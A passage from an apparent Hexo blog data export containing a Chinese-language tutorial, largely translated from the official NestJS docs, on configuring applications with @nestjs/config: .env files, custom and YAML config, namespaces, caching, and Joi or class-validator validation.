dbConfig.port;\n```\n\n`get()`方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示:\n\n```ts\n// use \"localhost\" when \"database.host\" is not defined\nconst dbHost = this.configService.get<string>('database.host', 'localhost');\n```\n\n`ConfigService`有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下:\n\n```ts\ninterface EnvironmentVariables {\n  PORT: number;\n  TIMEOUT: string;\n}\n\n// somewhere in the code\nconstructor(private configService: ConfigService<EnvironmentVariables>) {\n  // this is valid\n  const port = this.configService.get<number>('PORT');\n\n  // this is invalid as URL is not a property on the EnvironmentVariables interface\n  const url = this.configService.get<string>('URL');\n}\n```\n\n## 配置命名空间\n\n`ConfigModule`允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 \"namespaced \"的配置对象，如下所示。\n\n```ts\nimport { registerAs } from '@nestjs/config';\n \nexport default registerAs('database', () => ({\n  host: process.env.DATABASE_HOST,\n  port: process.env.DATABASE_PORT || 5432\n}));\n```\n\n用`forRoot()`方法的参数对象的`load`属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。\n\n```ts\nimport databaseConfig from './config/database.config';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      load: [databaseConfig],\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n现在，要从`database`命名空间中获取`host`，使用点操作符。使用`database`作为属性名的前缀，对应于命名空间的名称（作为 `registerAs()` 函数的第一个参数传递）。\n\n```ts\nconst dbHost = this.configService.get<string>('database.host');\n```\n\n一个合理的选择是直接注入`database`命名空间。这使我们能够从强类型化中获益。\n\n```ts\n// import { ConfigType } from '@nestjs/config';\n\nconstructor(\n  @Inject(databaseConfig.KEY)\n  private dbConfig: ConfigType<typeof databaseConfig>,\n) {}\n```\n\n## 缓存环境变量\n\n由于访问`process.env`会很慢，你可以设置传递给`ConfigModule.forRoot()`的`options`对象的`cache`属性，以提高`ConfigService`的性能。\n\n```ts\nConfigModule.forRoot({\n  cache: true,\n});\n```\n\n## 部分注册\n\n到目前为止，我们已经用`forRoot()`方法处理了根模块(如`AppModule`)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。`@nestjs/config`包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用`forFeature()`静态方法来执行这个部分注册，如下所示。\n\n```ts\nimport databaseConfig from './config/database.config';\n\n@Module({\n  imports: [ConfigModule.forFeature(databaseConfig)],\n})\nexport class DatabaseModule {}\n```\n\n## 校验环境变量\n\n\n如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。`@nestjsconfig`包有两种不同的方式来实现这一点。\n\n- [Joi](https://github.com/sideway/joi)内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。\n- 一个自定义的`validate()`函数，它接受环境变量作为输入。\n\n要使用Joi，我们必须安装Joi包:\n\n```shell\n$ yarn add joi\n```\n\n> 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。\n\n现在我们可以定义一个Joi验证模式，并通过`forRoot()`方法的选项对象的`validationSchema`属性传递，如下图所示。\n\n```ts\nimport * as Joi from 'joi';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validationSchema: Joi.object({\n        NODE_ENV: Joi.string()\n          .valid('development', 'production', 'test', 'provision')\n          .default('development'),\n        PORT: Joi.number().default(3000),\n      }),\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 `NODE_ENV`和`PORT`设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 `required()` 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。\n\n默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过`forRoot()`选项对象的`validationOptions`键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。\n\n\n```ts\nimport * as Joi from 'joi';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validationSchema: Joi.object({\n        NODE_ENV: Joi.string()\n          .valid('development', 'production', 'test', 'provision')\n          .default('development'),\n        PORT: Joi.number().default(3000),\n      }),\n      validationOptions: {\n        allowUnknown: false,\n        abortEarly: true,\n      },\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n`@nestjsconfig`包使用的默认设置是:\n\n- `allowUnknown`：控制是否允许在环境变量中使用未知键。默认为`true`。\n- `abortEarly`： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为`false`。\n\n请注意，一旦你决定传递一个`validationOptions`对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是`@nestjsconfig`默认值）。例如，如果你在你的自定义`validationOptions`对象中没有指定`allowUnknowns`，它将有Joi默认值`false`。因此，在您的自定义对象中指定这两个设置可能是最安全的。\n\n## 自定义校验函数\n\n另外，你也可以指定一个同步的`validate`函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。\n\n在这个例子中，我们将继续使用`class-transformer`和`class-validator`包。首先，我们必须定义。\n\n- 一个具有验证约束的类，\n- 一个使用 `plainToClass` 和 `validateSync` 函数的验证函数。\n\n```ts\nimport { plainToClass } from 'class-transformer';\nimport { IsEnum, IsNumber, validateSync } from 'class-validator';\n\nenum Environment {\n  Development = \"development\",\n  Production = \"production\",\n  Test = \"test\",\n  Provision = \"provision\",\n}\n\nclass EnvironmentVariables {\n  @IsEnum(Environment)\n  NODE_ENV: Environment;\n\n  @IsNumber()\n  PORT: number;\n}\n\nexport function validate(config: Record<string, unknown>) {\n  const validatedConfig = plainToClass(\n    EnvironmentVariables,\n    config,\n    { enableImplicitConversion: true },\n  );\n  const errors = validateSync(validatedConfig, { skipMissingProperties: false });\n\n  if (errors.length > 0) {\n    throw new Error(errors.toString());\n  }\n  return validatedConfig;\n}\n```\n\n完成这些之后，使用`validate`函数作为`ConfigModule`的配置选项，如下所示:\n\n```ts\nimport { validate } from './env.validation';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validate,\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n## 自定义getter函数\n\n`ConfigService`定义了一个通用的`get()`方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。\n\n```ts\n@Injectable()\nexport class ApiConfigService {\n  constructor(private configService: ConfigService) {}\n\n  get isAuthEnabled(): boolean {\n    return this.configService.get('AUTH_ENABLED') === 'true';\n  }\n}\n```\n\n现在我们可以使用getter函数如下:\n\n```ts\n@Injectable()\nexport class AppService {\n  constructor(apiConfigService: ApiConfigService) {\n    if (apiConfigService.isAuthEnabled) {\n      // Authentication is enabled\n    }\n  }\n}\n```\n\n## 可扩展变量\n\n`@nestjsconfig`支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说\n\n```shell\nAPP_URL=mywebsite.com\nSUPPORT_EMAIL=support@${APP_URL}\n```\n\n通过这种结构，变量`SUPPORT_EMAIL`解析为`support@mywebsite.com`。请注意使用 `${...}` 语法来触发解析 `SUPPORT_EMAIL` 定义中的变量 `APP_URL` 的值。\n\n> 对于这个功能，`@nestjsconfig`包内部使用`dotenv-expand`。\n\n使用传递给`ConfigModule`的`forRoot()`方法的选项对象中的`expandVariables`属性启用环境变量扩展，如下所示。\n\n```ts\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      // ...\n      expandVariables: true,\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n## 在 `main.ts` 中使用\n\n虽然我们的配置是存储在service中的，但它仍然可以在`main.ts`文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。\n\n要访问它，你必须使用`app.get()`方法，然后是服务引用。\n\n```ts\nconst configService = app.get(ConfigService);\n```\n\n然后，你可以像往常一样，通过调用配置键的get方法来使用它。\n\n```ts\nconst port = configService.get('PORT');\n```\n\n> 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。\n","source":"_posts/NestJS - 配置.md","raw":"---\ntitle: NestJS - 配置\ndate: 2021-03-17 11:25:10\ntags:\n---\n\n应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。\n\n<!-- more -->\n\n在`Node`中，外部定义的环境变量通过`procress.env`全局可见。在Node.js应用程序中，通常使用`.env`文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。\n\n解析`.env`文件并加载到`procress.env`中，就需要使用`dotenv`这个包了，但是Nest提供了一个配置环境变量的软件包 - `@nestjs/config`，其内部依赖了`dotenv`。\n\n## 安装`@nestjs/config`\n\n```shell\n// npm\n$ npm i --save @nestjs/config\n\n// yarn\n$ yarn add @nestjs/config\n```\n\n## 简单使用\n\n安装完成后，我们可以导入`ConfigModule`。通常，我们将其导入根目录`AppModule`并使用. `forRoot()`静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的`ConfigService`类的选项`ConfigModule`。\n\n```typescript\nimport { Module } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\n\n@Module({\n  imports: [ConfigModule.forRoot()],\n})\nexport class AppModule {}\n```\n\n上面的代码将从`.env`默认位置（项目根目录）加载并解析文件，将文件中的键/值对`.env`与分配给其的环境变量合并`process.env`，并将结果存储在私有结构中，您可以通过访问该私有结构`ConfigService`。该`forRoot()`方法注册了`ConfigService`提供程序，该提供程序提供了`get()`一种读取这些已解析/合并的配置变量的方法。由于`@nestjs/config`依赖于[dotenv](https://github.com/motdotla/dotenv)，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在`.env`文件中同时存在时，运行时环境变量优先。\n\n示例`.env`文件如下所示：\n\n```bash\nDATABASE_USER=test\nDATABASE_PASSWORD=test\n```\n\n## 自定义ENV文件路径\n\n默认情况下，程序会在应用程序的根目录中查找`.env`文件。要为`.env`文件指定其他路径，请设置`forRoot()`的可选属性`envFilePath`，如下所示：\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: '.development.env',\n});\n```\n\n您还可以为`.env`文件指定多个路径，如下所示：\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: ['.env.development.local', '.env.development'],\n});\n```\n\n如果在多个文件中找到一个变量，则第一个优先。\n\n在实际开发中，往往有多个配置文件，比如开发环境使用`.development.env`配置文件，测试环境使用`.test.env`配置文件，生产环境使用`.production.env`配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下：\n\n```json\n// package.json\n{\n    ...\n    \"scripts\": {\n        \"start\": \"cross-env NODE_ENV=development nest start\",\n        \"start:dev\": \"cross-env NODE_ENV=development nest start --watch\",\n        \"start:prod\": \"cross-env NODE_ENV=production node dist/main\",\n        \"test\": \"cross-env NODE_ENV=test jest\",\n      },\n    ...\n}\n```\n\n> 安装`cross-env`，使用它跨平台的设置环境变量\n\n```typescript\nConfigModule.forRoot({\n  envFilePath: `${process.env.NODE_ENV || 'development'}.env`,\n});\n```\n\n## 使用全局module\n\n如果要`ConfigModule`在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将`options`对象的`isGlobal`属性设置为`true`，将其声明为全局模块，如下所示。在这种情况下，一旦`ConfigModule`被加载到根模块中，就不需要在其他模块中导入`ConfigModule`了\n\n```ts\nConfigModule.forRoot({\n  isGlobal: true,\n});\n```\n\n## 自定义配置文件\n\n对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。\n\n自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。`process.env`对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如\n\n\n```ts\nexport default () => ({\n  port: parseInt(process.env.PORT, 10) || 3000,\n  database: {\n    host: process.env.DATABASE_HOST,\n    port: parseInt(process.env.DATABASE_PORT, 10) || 5432\n  }\n});\n```\n\n将其传给`ConfigModule.forRoot()`的`load`属性，来加载这个自定义配置：\n\n```ts\nimport configuration from './config/configuration';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      load: [configuration],\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n> load属性是个数组，允许加载多个自定义配置文件\n\n通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。\n\n```yaml\nhttp:\n  host: 'localhost'\n  port: 8080\n\ndb:\n  postgres:\n    url: 'localhost'\n    port: 5432\n    database: 'yaml-db'\n\n  sqlite:\n    database: 'sqlite.db'\n```\n\n为了读取和解析YAML文件，我们可以利用`js-yaml`包。\n\n```shell\n$ npm i js-yaml\n$ npm i -D @types/js-yaml\n```\n\n安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。\n\n```ts\nimport { readFileSync } from 'fs';\nimport * as yaml from 'js-yaml';\nimport { join } from 'path';\n\nconst YAML_CONFIG_FILENAME = 'config.yml';\n\nexport default () => {\n  return yaml.load(\n    fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), 'utf8'),\n  );\n};\n```\n\n## 使用`ConfigService`\n\n要从`ConfigService`中访问配置值，我们首先得注入`ConfigService`，和使用其他`provider`一样，我们需要将其加入@Module的`imports`属性中（如果将`ConfigModule`配置成全局module，则可以忽略这一步）\n\n\n```ts\n@Module({\n  imports: [ConfigModule],\n  // ...\n})\n```\n\n然后我们可以使用标准的构造函数注入:\n\n```ts\n// import { ConfigService } from '@nestjs/config';\n\nconstructor(private configService: ConfigService) {}\n```\n\n获取\n\n```ts\n// get an environment variable\nconst dbUser = this.configService.get<string>('DATABASE_USER');\n\n// get a custom configuration value\nconst dbHost = this.configService.get<string>('database.host');\n```\n\n如上所示，使用`configService.get()`方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，`get<string>(…)`)。`get()`方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。\n\n你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。\n\n```ts\ninterface DatabaseConfig {\n  host: string;\n  port: number;\n}\n\nconst dbConfig = this.configService.get<DatabaseConfig>('database');\n\n// you can now use `dbConfig.port` and `dbConfig.host`\nconst port = dbConfig.port;\n```\n\n`get()`方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示:\n\n```ts\n// use \"localhost\" when \"database.host\" is not defined\nconst dbHost = this.configService.get<string>('database.host', 'localhost');\n```\n\n`ConfigService`有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下:\n\n```ts\ninterface EnvironmentVariables {\n  PORT: number;\n  TIMEOUT: string;\n}\n\n// somewhere in the code\nconstructor(private configService: ConfigService<EnvironmentVariables>) {\n  // this is valid\n  const port = this.configService.get<number>('PORT');\n\n  // this is invalid as URL is not a property on the EnvironmentVariables interface\n  const url = this.configService.get<string>('URL');\n}\n```\n\n## 配置命名空间\n\n`ConfigModule`允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 \"namespaced \"的配置对象，如下所示。\n\n```ts\nimport { registerAs } from '@nestjs/config';\n \nexport default registerAs('database', () => ({\n  host: process.env.DATABASE_HOST,\n  port: process.env.DATABASE_PORT || 5432\n}));\n```\n\n用`forRoot()`方法的参数对象的`load`属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。\n\n```ts\nimport databaseConfig from './config/database.config';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      load: [databaseConfig],\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n现在，要从`database`命名空间中获取`host`，使用点操作符。使用`database`作为属性名的前缀，对应于命名空间的名称（作为 `registerAs()` 函数的第一个参数传递）。\n\n```ts\nconst dbHost = this.configService.get<string>('database.host');\n```\n\n一个合理的选择是直接注入`database`命名空间。这使我们能够从强类型化中获益。\n\n```ts\n// import { ConfigType } from '@nestjs/config';\n\nconstructor(\n  @Inject(databaseConfig.KEY)\n  private dbConfig: ConfigType<typeof databaseConfig>,\n) {}\n```\n\n## 缓存环境变量\n\n由于访问`process.env`会很慢，你可以设置传递给`ConfigModule.forRoot()`的`options`对象的`cache`属性，以提高`ConfigService`的性能。\n\n```ts\nConfigModule.forRoot({\n  cache: true,\n});\n```\n\n## 部分注册\n\n到目前为止，我们已经用`forRoot()`方法处理了根模块(如`AppModule`)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。`@nestjs/config`包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用`forFeature()`静态方法来执行这个部分注册，如下所示。\n\n```ts\nimport databaseConfig from './config/database.config';\n\n@Module({\n  imports: [ConfigModule.forFeature(databaseConfig)],\n})\nexport class DatabaseModule {}\n```\n\n## 校验环境变量\n\n\n如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。`@nestjsconfig`包有两种不同的方式来实现这一点。\n\n- [Joi](https://github.com/sideway/joi)内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。\n- 一个自定义的`validate()`函数，它接受环境变量作为输入。\n\n要使用Joi，我们必须安装Joi包:\n\n```shell\n$ yarn add joi\n```\n\n> 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。\n\n现在我们可以定义一个Joi验证模式，并通过`forRoot()`方法的选项对象的`validationSchema`属性传递，如下图所示。\n\n```ts\nimport * as Joi from 'joi';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validationSchema: Joi.object({\n        NODE_ENV: Joi.string()\n          .valid('development', 'production', 'test', 'provision')\n          .default('development'),\n        PORT: Joi.number().default(3000),\n      }),\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 `NODE_ENV`和`PORT`设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 `required()` 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。\n\n默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过`forRoot()`选项对象的`validationOptions`键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。\n\n\n```ts\nimport * as Joi from 'joi';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validationSchema: Joi.object({\n        NODE_ENV: Joi.string()\n          .valid('development', 'production', 'test', 'provision')\n          .default('development'),\n        PORT: Joi.number().default(3000),\n      }),\n      validationOptions: {\n        allowUnknown: false,\n        abortEarly: true,\n      },\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n`@nestjsconfig`包使用的默认设置是:\n\n- `allowUnknown`：控制是否允许在环境变量中使用未知键。默认为`true`。\n- `abortEarly`： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为`false`。\n\n请注意，一旦你决定传递一个`validationOptions`对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是`@nestjsconfig`默认值）。例如，如果你在你的自定义`validationOptions`对象中没有指定`allowUnknowns`，它将有Joi默认值`false`。因此，在您的自定义对象中指定这两个设置可能是最安全的。\n\n## 自定义校验函数\n\n另外，你也可以指定一个同步的`validate`函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。\n\n在这个例子中，我们将继续使用`class-transformer`和`class-validator`包。首先，我们必须定义。\n\n- 一个具有验证约束的类，\n- 一个使用 `plainToClass` 和 `validateSync` 函数的验证函数。\n\n```ts\nimport { plainToClass } from 'class-transformer';\nimport { IsEnum, IsNumber, validateSync } from 'class-validator';\n\nenum Environment {\n  Development = \"development\",\n  Production = \"production\",\n  Test = \"test\",\n  Provision = \"provision\",\n}\n\nclass EnvironmentVariables {\n  @IsEnum(Environment)\n  NODE_ENV: Environment;\n\n  @IsNumber()\n  PORT: number;\n}\n\nexport function validate(config: Record<string, unknown>) {\n  const validatedConfig = plainToClass(\n    EnvironmentVariables,\n    config,\n    { enableImplicitConversion: true },\n  );\n  const errors = validateSync(validatedConfig, { skipMissingProperties: false });\n\n  if (errors.length > 0) {\n    throw new Error(errors.toString());\n  }\n  return validatedConfig;\n}\n```\n\n完成这些之后，使用`validate`函数作为`ConfigModule`的配置选项，如下所示:\n\n```ts\nimport { validate } from './env.validation';\n\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      validate,\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n## 自定义getter函数\n\n`ConfigService`定义了一个通用的`get()`方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。\n\n```ts\n@Injectable()\nexport class ApiConfigService {\n  constructor(private configService: ConfigService) {}\n\n  get isAuthEnabled(): boolean {\n    return this.configService.get('AUTH_ENABLED') === 'true';\n  }\n}\n```\n\n现在我们可以使用getter函数如下:\n\n```ts\n@Injectable()\nexport class AppService {\n  constructor(apiConfigService: ApiConfigService) {\n    if (apiConfigService.isAuthEnabled) {\n      // Authentication is enabled\n    }\n  }\n}\n```\n\n## 可扩展变量\n\n`@nestjsconfig`支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说\n\n```shell\nAPP_URL=mywebsite.com\nSUPPORT_EMAIL=support@${APP_URL}\n```\n\n通过这种结构，变量`SUPPORT_EMAIL`解析为`support@mywebsite.com`。请注意使用 `${...}` 语法来触发解析 `SUPPORT_EMAIL` 定义中的变量 `APP_URL` 的值。\n\n> 对于这个功能，`@nestjsconfig`包内部使用`dotenv-expand`。\n\n使用传递给`ConfigModule`的`forRoot()`方法的选项对象中的`expandVariables`属性启用环境变量扩展，如下所示。\n\n```ts\n@Module({\n  imports: [\n    ConfigModule.forRoot({\n      // ...\n      expandVariables: true,\n    }),\n  ],\n})\nexport class AppModule {}\n```\n\n## 在 `main.ts` 中使用\n\n虽然我们的配置是存储在service中的，但它仍然可以在`main.ts`文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。\n\n要访问它，你必须使用`app.get()`方法，然后是服务引用。\n\n```ts\nconst configService = app.get(ConfigService);\n```\n\n然后，你可以像往常一样，通过调用配置键的get方法来使用它。\n\n```ts\nconst port = configService.get('PORT');\n```\n\n> 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。\n","slug":"NestJS - 配置","published":1,"updated":"2022-03-06T08:42:02.799Z","_id":"cl0eyp64v0001homm3f8937ev","comments":1,"layout":"post","photos":[],"link":"","content":"<html><head></head><body><p>应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。</p>\n<span id=\"more\"></span>\n\n<p>在<code>Node</code>中，外部定义的环境变量通过<code>procress.env</code>全局可见。在Node.js应用程序中，通常使用<code>.env</code>文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。</p>\n<p>解析<code>.env</code>文件并加载到<code>procress.env</code>中，就需要使用<code>dotenv</code>这个包了，但是Nest提供了一个配置环境变量的软件包 - <code>@nestjs/config</code>，其内部依赖了<code>dotenv</code>。</p>\n<h2 id=\"安装-nestjs-config\"><a href=\"#安装-nestjs-config\" class=\"headerlink\" title=\"安装@nestjs/config\"></a>安装<code>@nestjs/config</code></h2><figure class=\"highlight shell hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// npm</span><br><span class=\"line\"><span class=\"hljs-meta\">$ </span><span class=\"hljs-language-bash\">npm i --save @nestjs/config</span></span><br><span class=\"line\"></span><br><span class=\"line\">// yarn</span><br><span class=\"line\"><span class=\"hljs-meta\">$ </span><span class=\"hljs-language-bash\">yarn add @nestjs/config</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h2><p>安装完成后，我们可以导入<code>ConfigModule</code>。通常，我们将其导入根目录<code>AppModule</code>并使用. <code>forRoot()</code>静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的<code>ConfigService</code>类的选项<code>ConfigModule</code>。</p>\n<figure class=\"highlight typescript hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-keyword\">import</span> { <span class=\"title class_\">Module</span> } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"hljs-keyword\">import</span> { <span class=\"title class_\">ConfigModule</span> } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'@nestjs/config'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"hljs-meta\">@Module</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>()],</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">class</span> <span class=\"title class_\">AppModule</span> {}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面的代码将从<code>.env</code>默认位置（项目根目录）加载并解析文件，将文件中的键/值对<code>.env</code>与分配给其的环境变量合并<code>process.env</code>，并将结果存储在私有结构中，您可以通过访问该私有结构<code>ConfigService</code>。该<code>forRoot()</code>方法注册了<code>ConfigService</code>提供程序，该提供程序提供了<code>get()</code>一种读取这些已解析/合并的配置变量的方法。由于<code>@nestjs/config</code>依赖于<a href=\"https://github.com/motdotla/dotenv\">dotenv</a>，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在<code>.env</code>文件中同时存在时，运行时环境变量优先。</p>\n<p>示例<code>.env</code>文件如下所示：</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASE_USER=<span class=\"hljs-built_in\">test</span></span><br><span class=\"line\">DATABASE_PASSWORD=<span class=\"hljs-built_in\">test</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"自定义ENV文件路径\"><a href=\"#自定义ENV文件路径\" class=\"headerlink\" title=\"自定义ENV文件路径\"></a>自定义ENV文件路径</h2><p>默认情况下，程序会在应用程序的根目录中查找<code>.env</code>文件。要为<code>.env</code>文件指定其他路径，请设置<code>forRoot()</code>的可选属性<code>envFilePath</code>，如下所示：</p>\n<figure class=\"highlight typescript hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">envFilePath</span>: <span class=\"hljs-string\">'.development.env'</span>,</span><br><span class=\"line\">});</span><br></pre></td></tr></tbody></table></figure>\n\n<p>您还可以为<code>.env</code>文件指定多个路径，如下所示：</p>\n<figure class=\"highlight typescript hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>({</span><br><span class=\"line\">  <span class=\"hljs-attr\">envFilePath</span>: [<span class=\"hljs-string\">'.env.development.local'</span>, <span class=\"hljs-string\">'.env.development'</span>],</span><br><span 